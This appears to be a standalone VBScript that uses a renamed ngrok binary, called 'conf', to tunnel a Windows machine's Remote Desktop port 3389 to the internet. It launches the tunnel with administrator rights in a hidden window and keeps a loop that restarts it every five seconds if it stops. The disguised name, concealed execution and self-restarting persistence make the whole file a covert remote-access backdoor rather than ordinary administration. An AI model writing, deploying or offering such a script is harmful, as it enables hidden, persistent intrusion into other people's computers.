Set WshShell = CreateObject("WScript.Shell")

' Function to check if a process is running
Function IsProcessRunning(processName)
    Dim objWMIService, colProcesses, objProcess

    Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
    Set colProcesses = objWMIService.ExecQuery("Select * from Win32_Process Where Name = '" & processName & "'")

    If colProcesses.Count > 0 Then
        IsProcessRunning = True
    Else
        IsProcessRunning = False
    End If
End Function

' Start ngrok as administrator using PowerShell
WshShell.Run "powershell -Command ""Start-Process 'cmd' -ArgumentList '/c start /b conf tcp 3389' -Verb RunAs -WindowStyle Hidden""", 0, True

' Check for ngrok process and reconnect if necessary
Do
    WScript.Sleep 5000 ' Sleep for 5 seconds before checking again
    If Not IsProcessRunning("conf.exe") Then
        ' If ngrok process is not running, restart ngrok
        WshShell.Run "powershell -Command ""Start-Process 'cmd' -ArgumentList '/c start /b conf tcp 3389' -Verb RunAs -WindowStyle Hidden""", 0, True
    End If
Loop
